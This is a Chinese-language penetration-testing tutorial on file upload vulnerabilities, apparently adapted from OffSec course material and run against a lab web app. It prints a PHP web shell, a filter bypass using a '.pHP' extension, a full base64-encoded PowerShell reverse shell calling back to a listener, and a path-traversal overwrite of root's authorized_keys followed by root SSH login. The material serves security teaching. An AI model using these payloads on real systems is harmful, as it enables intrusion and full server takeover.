---
title: "常見網頁應用服務攻擊之檔案上傳漏洞"
date: 2025-11-15
description: "通常只要網頁需要跟使用者進行互動，都會提供檔案上傳的功能，但這也會出現問題，我們可以利用檔案上傳漏洞(File Upload Vulnerability)來存取伺服器系統或者執行惡意code，通常檔案上傳漏洞可以被分成三個種類"
hideTOC: false
targetKeyword: 檔案上傳漏洞
draft: false
tags: 
  - "php"
  - "web-shell"
  - "檔案上傳"
  - "目錄遍歷漏洞"
  - "相對路徑"
lang: zh
---
## 前言

通常只要網頁需要跟使用者進行互動，都會提供檔案上傳的功能，但這也會出現問題，我們可以利用檔案上傳漏洞來存取伺服器系統或者執行惡意 code，通常檔案上傳漏洞可以被分成三個種類

第一種，利用這個漏洞我們可以上傳檔案，並且用網頁應用服務來執行該檔案，舉例來說，如果我們可以上傳一個 php 腳本進網頁伺服器而該網頁伺服器可以執行 php 的內容，那我們便可以透過瀏覽器或 curl 來存取並執行這個腳本

在檔案引用漏洞的文章中，我們也提及了這類型的漏洞可以執行除了 php 之外的框架或伺服器程式語言

再來第二種，我們必須組合檔案上傳機制跟其他漏洞才有機會攻擊成功，例如搭配目錄遍歷手法，像是如果目標網頁應用服務存在目錄遍歷漏洞時，我們可以找到檔案上傳請求的相對位置，嘗試覆寫 ”authorized_keys” 這類系統層級的檔案

更甚者，我們可以組合檔案上傳機制搭配 XML 外部元件 (XML External Entity, XXE) 或者 [[cross-site-scripting-xss-introduction|Cross-Site Scripting (XSS) 跨網站腳本漏洞]]，舉例來說，當目標允許上傳一組 SVG 格式檔案的頭貼到帳號時，我們就可以嵌入一組 XXE 攻擊來顯示檔案系統裡的內容，或甚至執行任意的惡意 code

而最後第三種，仰賴於使用者的互動，舉例來說，當我們在找工作時，投遞履歷的網頁系統都會有上傳檔案的表單，這時就可以嘗試上傳一份惡意的履歷，這份履歷可以是由 .docx 檔案寫成，但裡面包含著惡意的巨集

但由於這個類型需要受害者存取我們上傳的檔案，而後續還需要遠端操控，其複雜度較高，所以在檔案上傳漏洞中，前兩個漏洞討論的熱度比較高

## 利用可執行檔案

這個方法取決於網頁應用服務的架構，如果目標有使用內容管理系統 (Content Management System, CMS)，意思是後端有架設資料庫，這種情況時代表我們可以上傳自己的頭貼，或者建立部落格文章以及有包含下載檔案的頁面

如果我們的目標是公司網頁，通常就會發現存在可以上傳履歷的頁面，或者需要私人諮詢時的聯絡資訊表單，舉例來說，如果我們的目標是一家律師事務所的網站，就可能出現一個上傳案件的頁面

有時候，上傳檔案的機制可能不會很明顯，所以我們事前在頁面枚舉搜集資訊時不能跳過，否則有可能忽略了一個攻擊面向

在實驗中，我們要假裝誤用了檔案上傳機制，來執行惡意 code 以及獲得逆向 shell，我們用 ”Mountain Desserts” 網頁應用服務來呈現，找到這台機器裡頁面有上傳的地方

![Updated-Mountain-Desserts-Web-Application](https://media.secologies.com/Updated-Mountain-Desserts-Web-Application.webp)
*[^2]*

該實驗機器是由 XAMPP 建立起來的，並且是在 Windows 系統環境之下，我們先來建立一個文字檔，看看上傳文字檔案而不是圖片檔時會發生什麼事

```
kali@kali:~$ echo "this is a test" > test.txt
```

而我們嘗試上傳這個測試用的檔案到應用服務的表單裡

![Successful-Upload-of-test.txt](https://media.secologies.com/Successful-Upload-of-test.txt.webp)
*[^2]*

上圖顯示我們成功上傳的回應，代表這個這個系統的上傳機制並沒有限制只能某些圖片檔案格式，接著，我們可以嘗試上傳 simple-backdoor.php 網頁 shell

```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

![Failed-Upload-of-simple-backdoor.php_](https://media.secologies.com/Failed-Upload-of-simple-backdoor.php_.webp)
*[^2]*

真意外！文字檔 ok 但是封鎖掉我們上傳的 php 檔案了，代表目標的網頁應用服務應該是把附檔名是 php 的都列入黑名單，由於我們並不知道實際過濾器所有的規則，這種時候我們就只能夠在錯誤中嘗試了

把我們手邊所有的工具都拿來嘗試找出一個方法來繞過，而在實驗過程中，我們發現一組方法可以繞過，就是把原先常見的 php 附檔名格式改成更少見的型態，例如 ”.phps” 或者 ”.php7”

這個方法可以繞過簡易的過濾器規則，如果過濾器只檢查檔案格式是 ”.php” 或 ”.phtml” 的話就可以成功，而 ”.phps” 或者 ”.php7” 替代格式雖然是用在舊版的 php 框架裡，或者某些特定使用情形的環境下，但近代的 PHP 架構還是支援這些格式

另一種比較直觀的想法是，直接把附檔名的字元變更成大寫，如果目標網站的後端工程師非常懶的話，他們有可能就只是比對字串來做成黑名單，並且預設使用者只會上傳小寫的 ”.php” 格式檔案

如果真有這種事，我們就可以更新一下檔案格式變成大寫來繞過，在我們的環境下實驗第二種方法，更新 simple-backdoor.php 附檔名，從 ”.php” 弄成 ”.pHP”，再重新上傳一次

![Successful-Upload-of-simple-backdoor.pHP_](https://media.secologies.com/Successful-Upload-of-simple-backdoor.pHP_.webp)
*[^2]*

如此小小的改動卻成功繞過了，在滲透測試時，有時候天馬行空的想法不要馬上排除，有可能成功的路徑就藏在這些意想不到之中，畢竟打 CTF 時也常常在通靈嘛

而成功繞過並且上傳後，我們就可以利用 [[file-inclusion-vulnerabilities-lfi-and-rfi|常見網頁應用服務攻擊之檔案引用漏洞 LFI&RFI]] 的 RFI 方法來引用並執行 code 裡的內容，在腳本裡我們要它顯示上傳到的地方，其輸出的結果表示它被放到一個叫做 ”uploads” 的目錄底下

如此我們可以確定的確有一個叫做 ”uploads” 的檔案目錄存在，接著我們用 curl 存取網站，呼叫我們上傳的腳本，在 cmd 的參數底下使用 ”dir” 索引出全部的檔案

```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
  Directory of C:\xampp\htdocs\meteor\uploads
11/12/2025 09:23 AM <DIR>  .
11/12/2025 09:23 AM <DIR>  ..
11/12/2025 10:21 AM        328 simple-backdoor.pHP
11/12/2025 10:03 AM        15 test.txt
              2 File(s) 343 bytes
              2 Dir(s) 15,410,925,568 bytes free
...
```

上述顯示我們的 dir 指定輸出結果，代表我們可以在目標系統內執行任意的指令

儘管這種繞過的方法很基礎，但通常都很有效，而我們也可以來啟動上傳的逆向 shell，一樣把 Netcat 監聽打開，我們實驗監聽 port 4444 接收目標網頁系統回傳的資訊

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

前面提到目標系統環境是 Windows，所以我們可以嘗試單行式 PowerShell(PowerShell one-liner) 來執行逆向 shell，由於這種型態的逆向 shell 會包含數個特殊字元在裡頭，我們就必須將這些字串編碼成 base64 的格式

通常可以直接用 PowerShell 或者線上的轉換器[^1]來編碼，而我們嘗試使用 Kali 裡的 PowerShell 來編碼我們的單行逆向 shell

首先，我們建一個變數 \$Text，這個變數用來儲存單行逆向 shell 為一組字串，接著我們用 convert 這個方法搭配 Unicode 的特性，在 Encoding 這個 class 裡頭把 \$Text 變數的內容給編碼起來

```
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object
System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

PS> exit
```

在上述的單行逆向 shell 中我們最後讓編碼成 base64 格式的資料儲存進 \$EncodedText 這個變數裡，而我們就能夠用 curl 來呼叫 simple-backdoor.pHP 來執行這段 code

在 PowerShell 裡，我們可以使用 "-enc" 這個參數來額外新增 base64 編碼的字串進去指令中，同時搭配 URL 編碼把一些空格處理掉

```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

送出我們的逆向 shell 後，可以在我們剛才監聽的頁面裡收到回傳的資訊

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

  Connection-specific DNS Suffix . :
  IPv4 Address. . . . . . . . . . . : 192.168.50.189
  Subnet Mask . . . . . . . . . . . : 255.255.255.0
  Default Gateway . . . . . . . . . : 192.168.50.254

PS C:\xampp\htdocs\meteor\uploads> whoami
ny authority\system
```

上面的結果就是回傳的資訊，看來是成功的，太讚了！

以上就是我們可以誤用 PHP 頁面裡的檔案上傳機制，透過我們的 Kali 來執行上傳上去的網頁 shell，但如果目標網頁伺服器後端使用的是 ASP 的話，我們一樣可以用上面的流程來執行 code，而不用另外寫一個 ASP 的網頁 shell

幸運的是，Kali Linux 裡面已經包含許多種網頁 shell 應付各式各樣的框架及語言了，如我們之前提到的都儲存在 "/usr/share/webshells/" 這個目錄底下

```
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x 8 root root 4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x 2 root root 4096 Feb 11 01:58 asp
drwxr-xr-x 2 root root 4096 Apr 25 07:25 aspx
drwxr-xr-x 2 root root 4096 Feb 11 01:58 cfm
drwxr-xr-x 2 root root 4096 Apr 25 07:06 jsp
lrwxrwxrwx 1 root root 19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x 2 root root 4096 Feb 11 01:58 perl
drwxr-xr-x 3 root root 4096 Feb 11 01:58 php
```

上述就是該目錄底下已經存在的語言或框架，有興趣的讀者可以去看看，由於通常我們要接觸目標時才會知道該伺服器使用的語言，而不一定每次都可以同一套打天下，所以了解各式各樣的技術對於讀者來說是必要的功課

尤其當您遇到更新的架構時，需要在網路上找是否有人寫新的 shell，或者要製造自己的工具時，詳細理解背後的實作原理才能夠在當下測試時做出反應

雖說目前的框架都很類似，但我們也會有需要識別不同種類或後端語言的情況，才有辦法找出上傳我們的網頁 shell，以及將 shell 放在目可以存取到的目錄位置，如此我們才能在系統裡執行指令

另外要注意的是，有時目標網頁應用服務的後端會建立黑名單來過濾上傳的資料格式，而此時我們必須找出可以繞過的方法，又或者我們可以走另一條路

有些網頁應用服務在我們上傳檔案後，其實還有重新命名檔案名字或變更檔案的功能，我們可以利用這點，在上傳完一組看似沒問題的檔案後，例如 .txt 格式檔案，再把檔名改回原本我們想要的副檔名格式

## 利用非執行檔案

上一節我們認知到如果網頁伺服器的檔案上傳有嚴重的缺陷，就能夠讓攻擊者執行他們想要做的事情，而帶來嚴重的後果，甚至，即便上傳的檔案不能夠執行，也有辦法造成破壞

有時我們就是會遇到上傳機制沒有限制任何檔案格式，但還是無法利用的情形發生，例如在 Google 雲端我們可以上傳任何型態的檔案，但沒辦法利用檔案取得存取系統的效果

在這種情況下，我們必須依賴其他種的漏洞，像是目錄遍歷來誤用檔案上傳功能，我們一樣在 "Mountain Desserts" 來實驗

![Mountain-Desserts-Application-on-Windows](https://media.secologies.com/Mountain-Desserts-Application-on-Windows.webp)
*[^2]*

我們一樣建置一個可以上傳的網頁應用服務，而目標系統我們建立在 Linux 系統上，這次我們沒有 Admin 連結或者 index.php 在 URL 裡，首先遇到這種情況時應該用 curl 來確認 admin.php 跟 index.php 檔案是否還存在

```
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```

我們檢查時發現這幾個頁面檔案都不在目標伺服器裡，所以我們可以認為，這個網頁伺服器不是用 PHP 來建構的，我們一樣上傳文字檔案，不過我們換成在 Burp Suite 上送出請求

![Text-file-successfully-uploaded](https://media.secologies.com/Text-file-successfully-uploaded.webp)
*[^2]*

成功上傳後網頁一樣顯示出資訊，通常我們在測試檔案上傳表單時，我們會需要上傳個兩次以上，來看看每次給的結果如何，如果伺服器回應說檔案已存在，我們就有辦法透過暴力破解的方法得到伺服器裡的資訊

而如果伺服器回應給我們的是錯誤資訊，就有辦法從不同檔案的錯誤資訊中拼湊出有價值的情報，例如後端伺服器使用的程式語言或架構等等

在 Burp Suite 裡我們用 POST 請求送出，通常 HTML 的上傳機制是吃這個型態，在歷史記錄中我們一樣送到 Repeater 裡運作

![POST-request-for-the-file-upload-of-test.txt-in-Burp](https://media.secologies.com/POST-request-for-the-file-upload-of-test.txt-in-Burp.webp)
*[^2]*

上圖我們接收到跟網頁一樣的資訊，但沒有任何新的或有價值的資訊，接著我們可以來確認網頁伺服器允不允許我們使用相對路徑，利用目錄遍歷指定網頁根目錄之外的地方上傳我們的檔案

利用 "filename" 這個參數來指定成 "../../../../../../../test.txt" 檔案上傳，再送出一次來測試看看回應

![Relative-path-in-filename-to-upload-file-outside-of-web-root](https://media.secologies.com/Relative-path-in-filename-to-upload-file-outside-of-web-root.webp)
*[^2]*

回應給我們的是 "../" 相對路徑字串都有成功吃進去，但不幸的是，我們不知道檔案上傳的確切位置，有可能網頁應用服務只是回應了我們的檔名，但其實內部伺服器已經把相對路徑字串給清洗掉了

但目前我們也沒有其他種攻擊路徑可以考慮，就只能先假設我們設置的相對路徑有成功被使用進去了，如果我們真的猜對了，就可以嘗試盲覆寫這過檔案了，之後就可以讓我們存取系統

要特別注意的是，如果讀者在現實中進行滲透測試，盲覆寫有可能造成檔案的損毀，或者目標系統重大斷線損失，所以我們需要先了解目標網頁伺服器的帳號以及權限資訊，才不會做出錯誤的判斷

通常網頁應用服務會使用像是 Apache、Nginx 或其他種網頁伺服器來架設，而這些服務會執行特定的使用者，例如在 Linux 內就是 "www-data" 這個目錄

而 Windows 傳統上是架設 IIS 網頁伺服器來執行網路服務帳號，通常這個服務都是用無密碼且低權限的帳號作為使用者，而在 IIS 7.5 版本之後，微軟開發了一個 IIS 應用程式集區身分識別 (IIS Application Pool Identities)[^3] 的擴充彌補這個缺失

它會在 Windows 裡的應用程式集區裡建立多個虛擬帳號，以用來執行網頁應用服務，每個集區裡有自己的集區身份，是為了更精確的區分不同應用服務需要的權限而分割出來

但基於這點，由於管理員或開發人員經常用 root 或者管理角色權限來部署網頁，只為了避開權限的問題，而完全不用任何權限分割的架構

導致如果我們想要驗證我們是否可以使用 root 或管理員權限進行上傳漏洞，我們可以在建構 shell 時使用跟目標網頁伺服器背後一樣的程式語言，所以我們來嘗試看看，是否可以利用 root 權限來覆寫在家目錄底下的 "authorized_keys" 檔案

如果這把 key 裡面的公私鑰都被我們控制住，我們就可以用 root 權限透過 SSH 來連線進系統存取了，我們先用 SSH 金鑰配對 ssh-keygen 來產生一組，同時這把公私鑰對我們命名為 "authorized_keys"

```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
kali@kali:~$ cat fileup.pub > authorized_keys
```

此時這把 "authorized_keys" 檔案包含我們知道的公鑰，接著我們利用相對路徑 "../../../../../../../root/.ssh/authorized_keys" 上傳到目標伺服器裡，我們把 Burp 攔截打開，在上傳頁面一樣選擇 "authorized_keys"

而在 Burp 裡我們把上傳的欄位調整成上面的相對路徑，調整完後再送出

![Exploit-File-Upload-to-write-authorized_keys-file-in-root-home-directory](https://media.secologies.com/Exploit-File-Upload-to-write-authorized_keys-file-in-root-home-directory-scaled.webp)
*[^2]*

上圖就是我們變更了上傳欄位的請求，把我們自製的 "authorized_keys" 檔案放進去，如果成功複寫了目標伺服器裡的 root 使用者公私鑰對，我們就可以拿自己知道的私鑰透過 SSH 連線進去

由於 root 使用者通常沒有鎖著 SSH 連線權限，通常都預設只有真正的使用者才會知道密碼，就算在新的機器上也只是建立新的 fingerprint

另一個原因是我們在滲透測試時通常不知道系統裡還有什麼使用者，只有在使用 root 成功連線進去後看 "/etc/passwd" 時才會知道，這也是唯一的辦法

在實驗過程當中我們還發現目標系統同時也開啟了一個 port 2222 的 SSH 伺服器，我們一樣用方才放進去的 authorized_keys 檔案來嘗試連線，透過 "-i" 這個參數，我們可以指定我們自製的私鑰以及 "-p" 指定 port

如果讀者在之前有連線到其他種服務的話，就必須記得把 known_hosts 檔案給清空掉，由於該檔案會儲存以前的 SSH 連線紀錄

```
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

至此我們就可以利用先前自製的公私鑰對覆寫 "authorized_keys" 檔案，在透過 SSH 成功連線進去取得 root 使用者權限，所以讀者如果遇到沒辦法上傳檔案後執行的情形下

就必須花點心思考慮其他種攻擊路徑來利用了，事前了解各種網頁應用服務框架及語言是非常重要的，尤其目前還是有許多的技術以及擴充功能被開發出來

[^1]: HAZOTA Europe Kft, "BASE64 Decode and Encode," [https://www.base64encode.org/](https://www.base64encode.org/), 2010-2025.
[^2]: OffSec, "Common Web Application Attacks: File Upload Vulnerabilities," The Penetration Testing with Kali Linux (PEN-200).
[^3]: Thomas Deml, "IIS應用程式集區身分識別," [https://learn.microsoft.com/zh-tw/iis/manage/configuring-security/application-pool-identities](https://learn.microsoft.com/zh-tw/iis/manage/configuring-security/application-pool-identities), Microsoft Ignite, 2024/07/11.

